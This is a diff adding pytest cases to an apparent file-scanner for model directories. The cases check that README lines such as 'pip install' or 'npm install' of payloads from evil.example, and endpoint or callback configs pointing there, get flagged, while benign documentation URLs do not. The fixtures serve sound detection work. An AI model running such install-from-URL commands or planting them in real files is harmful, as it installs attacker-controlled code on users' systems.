@@ -273,6 +273,46 @@ def test_text_scanner_documentation_shell_substitution_remains_actionable(
     assert determine_exit_code(aggregate) == 1
 
 
+@pytest.mark.parametrize(
+    "content",
+    [
+        "pip install https://evil.example/payload.whl\n",
+        "python -m pip install https://evil.example/pkg.tar.gz\n",
+        "py -3.11 -m pip install https://evil.example/payload.whl\n",
+        "uv pip install https://evil.example/payload.whl\n",
+        "npm install https://evil.example/payload.tgz\n",
+    ],
+)
+def test_text_scanner_documentation_package_install_urls_remain_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_documentation_package_manager_prose_remains_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("Read the pip install guide at https://pip.pypa.io/en/stable/\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
 def test_text_scanner_indirect_network_api_call_remains_actionable(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text("executor.submit(requests.get, endpoint)\n", encoding="utf-8")
@@ -316,6 +356,8 @@ def test_text_scanner_documentation_code_url_argument_remains_actionable(tmp_pat
     "content",
     [
         "endpoint: https://evil.example/payload\n",
+        '{"endpoint": "https://evil.example/payload"}\n',
+        "{'callback': 'https://evil.example/payload'}\n",
         "<endpoint>https://evil.example/payload</endpoint>\n",
     ],
 )
@@ -331,6 +373,37 @@ def test_text_scanner_documentation_endpoint_config_remains_actionable(tmp_path:
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
+
+
+@pytest.mark.parametrize("padding", ["    ", " " * 300])
+def test_text_scanner_parenthesized_documentation_assignment_remains_actionable(
+    tmp_path: Path,
+    padding: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(f'endpoint = (\n{padding}"https://evil.example/payload"\n)\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_generic_quoted_url_mapping_remains_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text('{"project_url": "https://example.com/project"}\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
 
 
 @pytest.mark.parametrize(
